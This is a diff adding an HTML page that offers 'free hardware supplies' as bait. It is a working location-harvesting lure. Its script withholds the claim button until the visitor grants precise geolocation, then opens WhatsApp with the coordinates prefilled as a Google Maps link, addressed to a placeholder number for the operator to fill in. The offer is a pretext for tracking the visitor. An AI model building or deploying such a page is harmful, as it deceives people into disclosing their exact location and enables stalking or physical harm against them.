@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Free Hardware Supplies Offer</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 40px;
+    }
+    button {
+      padding: 15px 30px;
+      font-size: 16px;
+      background-color: green;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <h1>🎁 Claim Free Hardware Supplies</h1>
+  <p>To deliver the items, we need to confirm your location.</p>
+  <p id="status">Please wait...</p>
+  <button id="claimBtn" disabled>Claim Now</button>
+
+  <script>
+    let lat, lon;
+    const claimBtn = document.getElementById("claimBtn");
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(function(position) {
+        lat = position.coords.latitude;
+        lon = position.coords.longitude;
+        document.getElementById("status").textContent = "Location confirmed!";
+        claimBtn.disabled = false;
+      }, function(error) {
+        document.getElementById("status").textContent =
+          "Please allow location access to claim your supplies.";
+      });
+    } else {
+      document.getElementById("status").textContent =
+        "Your browser does not support location.";
+    }
+
+    claimBtn.addEventListener("click", function() {
+      const message = `Hi, I would like to claim the hardware supplies. Here's my location:\nhttps://www.google.com/maps?q=${lat},${lon}`;
+      const phoneNumber = "YOUR_PHONE_NUMBER"; // e.g., 919876543210
+      const url = `https://wa.me/${phoneNumber}?text=${encodeURIComponent(message)}`;
+      window.location.href = url;
+    });
+  </script>
+</body>
+</html>
